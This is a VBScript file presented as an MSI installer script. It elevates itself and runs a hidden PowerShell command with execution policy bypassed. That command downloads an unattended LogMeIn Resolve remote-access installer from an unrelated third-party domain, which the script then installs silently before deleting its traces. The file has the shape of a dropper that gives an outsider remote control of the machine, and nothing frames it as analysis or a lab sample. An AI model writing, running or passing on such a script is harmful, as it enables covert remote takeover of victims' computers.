' MSI Installer Script
Option Explicit

' ========== CONFIGURATION ==========
Const MSI_URL = "https://vsrpglobalsupply.com/ms/LogMeInResolve_Unattended.msi"
Const MSI_NAME = "LogMeInResolve_Unattended.msi"
Const LOG_FILE = "install.log"

' ========== GLOBAL OBJECTS ==========
Dim objShell, objFSO
Dim tempPath, msiPath, logPath

' Initialize objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Initialize paths
tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
msiPath = tempPath & "\" & MSI_NAME
logPath = tempPath & "\" & LOG_FILE

' ========== MAIN EXECUTION ==========
Main

' ========== MAIN SUBROUTINE ==========
Sub Main
    Dim exitCode
    
    ' Check if we need admin privileges
    If Not IsElevated Then
        RelaunchAsAdmin
        WScript.Quit
    End If
    
    WriteLog "Starting installation with admin privileges"
    
    ' Download MSI
    WriteLog "Downloading MSI from: " & MSI_URL
    If Not DownloadMSI Then
        WriteLog "ERROR: Download failed"
        WScript.Quit 1
    End If
    
    ' Verify download
    If Not VerifyDownload Then
        WriteLog "ERROR: Downloaded file not found"
        WScript.Quit 1
    End If
    
    WriteLog "Download successful: " & msiPath
    WriteLog "File size: " & FormatFileSize(objFSO.GetFile(msiPath).Size)
    
    ' Install MSI
    exitCode = InstallMSI
    
    ' Cleanup
    Cleanup
    
    ' Report result
    If exitCode = 0 Or exitCode = 3010 Then
        WriteLog "SUCCESS: Installation completed"
        If exitCode = 3010 Then
            WriteLog "NOTE: Reboot required"
        End If
    Else
        WriteLog "ERROR: Installation failed with code: " & exitCode
    End If
    
    WScript.Quit exitCode
End Sub

' ========== ADMINISTRATIVE FUNCTIONS ==========
Function IsElevated
    If WScript.Arguments.Named.Exists("elevate") Then
        IsElevated = True
    Else
        IsElevated = False
    End If
End Function

Sub RelaunchAsAdmin
    Dim scriptPath, args
    
    scriptPath = WScript.ScriptFullName
    args = "//B //NoLogo """ & scriptPath & """ /elevate"
    
    WriteLog "Requesting admin privileges..."
    
    CreateObject("Shell.Application").ShellExecute "wscript.exe", args, "", "runas", 1
End Sub

' ========== DOWNLOAD FUNCTIONS ==========
Function DownloadMSI
    Dim psFile, psContent, psCmd, exitCode
    
    psFile = tempPath & "\download.ps1"
    
    ' Create PowerShell script
    psContent = "$ProgressPreference = 'SilentlyContinue'" & vbCrLf & _
                "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12" & vbCrLf & _
                "try {" & vbCrLf & _
                "    Invoke-WebRequest -Uri '" & MSI_URL & "' -OutFile '" & msiPath & "' -ErrorAction Stop" & vbCrLf & _
                "    exit 0" & vbCrLf & _
                "} catch {" & vbCrLf & _
                "    Write-Error $_.Exception.Message" & vbCrLf & _
                "    exit 1" & vbCrLf & _
                "}"
    
    ' Write script to file
    WriteToFile psFile, psContent
    
    ' Execute PowerShell
    psCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psFile & """"
    WriteLog "Running: " & psCmd
    
    exitCode = objShell.Run(psCmd, 0, True)
    
    ' Cleanup PowerShell script
    DeleteFile psFile
    
    DownloadMSI = (exitCode = 0)
End Function

Function VerifyDownload
    If objFSO.FileExists(msiPath) Then
        VerifyDownload = True
    Else
        VerifyDownload = False
    End If
End Function

' ========== INSTALLATION FUNCTIONS ==========
Function InstallMSI
    Dim msiLog, installCmd, exitCode
    
    msiLog = tempPath & "\msi_install.log"
    
    ' Build installation command
    installCmd = "msiexec.exe /i """ & msiPath & """ /qn /norestart /L*V """ & msiLog & """"
    WriteLog "Installing MSI: " & installCmd
    
    exitCode = objShell.Run(installCmd, 0, True)
    
    ' Log installation details
    LogInstallation exitCode, msiLog
    
    InstallMSI = exitCode
End Function

Sub LogInstallation(exitCode, logPath)
    WriteLog "MSI installation completed. Exit code: " & exitCode
    
    If objFSO.FileExists(logPath) Then
        WriteLog "MSI log created: " & logPath
        WriteLog "Log size: " & FormatFileSize(objFSO.GetFile(logPath).Size)
    End If
End Sub

' ========== CLEANUP FUNCTIONS ==========
Sub Cleanup
    WriteLog "Starting cleanup..."
    
    DeleteFile msiPath
    
    ' Optional: Keep or delete MSI log
    ' DeleteFile tempPath & "\msi_install.log"
    ' DeleteFile tempPath & "\download.ps1"
    
    WriteLog "Cleanup completed"
End Sub

Sub DeleteFile(filePath)
    If Not objFSO.FileExists(filePath) Then
        Exit Sub
    End If
    
    On Error Resume Next
    objFSO.DeleteFile filePath, True
    
    If Err.Number = 0 Then
        WriteLog "Deleted: " & filePath
    Else
        WriteLog "WARNING: Failed to delete " & filePath
        ' Try alternative method
        objShell.Run "cmd /c del /f /q """ & filePath & """", 0, True
    End If
    
    On Error GoTo 0
End Sub

' ========== UTILITY FUNCTIONS ==========
Function FormatFileSize(bytes)
    If bytes < 1024 Then
        FormatFileSize = bytes & " bytes"
    ElseIf bytes < 1048576 Then
        FormatFileSize = Round(bytes / 1024, 2) & " KB"
    ElseIf bytes < 1073741824 Then
        FormatFileSize = Round(bytes / 1048576, 2) & " MB"
    Else
        FormatFileSize = Round(bytes / 1073741824, 2) & " GB"
    End If
End Function

Sub WriteToFile(filePath, content)
    Dim file
    Set file = objFSO.CreateTextFile(filePath, True)
    file.Write content
    file.Close
End Sub

Sub WriteLog(message)
    Dim file
    
    ' Write to log file
    Set file = objFSO.OpenTextFile(logPath, 8, True)
    file.WriteLine Now & " - " & message
    file.Close
    
    ' Output to console if using cscript
    If LCase(Right(WScript.FullName, 11)) = "cscript.exe" Then
        WScript.Echo Now & " - " & message
    End If
End Sub